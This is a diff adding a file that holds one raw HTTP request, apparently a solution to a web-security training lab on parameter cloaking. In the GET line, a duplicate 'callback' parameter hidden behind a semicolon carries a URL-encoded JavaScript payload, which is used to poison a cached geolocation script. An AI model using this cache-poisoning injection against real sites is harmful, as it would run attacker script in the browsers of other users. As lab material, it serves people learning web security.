@@ -1,0 +1,17 @@
+Lab: Parameter cloaking
+
+GET /js/geolocate.js?callback=setCountryCookie&utm_content=123;callback=%61%6c%65%72%74%28%31%29%3b%63%61%6e%61%72%79 HTTP/1.1
+Host: ac1c1fc71e0ddcfcc091375700eb0048.web-security-academy.net
+Cookie: country=[object Object]; session=0QmWGyVL2TBfSvnBVMxe7EqTdVhxted1
+Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
+Sec-Ch-Ua-Platform: "macOS"
+Accept: */*
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Dest: script
+Referer: https://ac1c1fc71e0ddcfcc091375700eb0048.web-security-academy.net/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
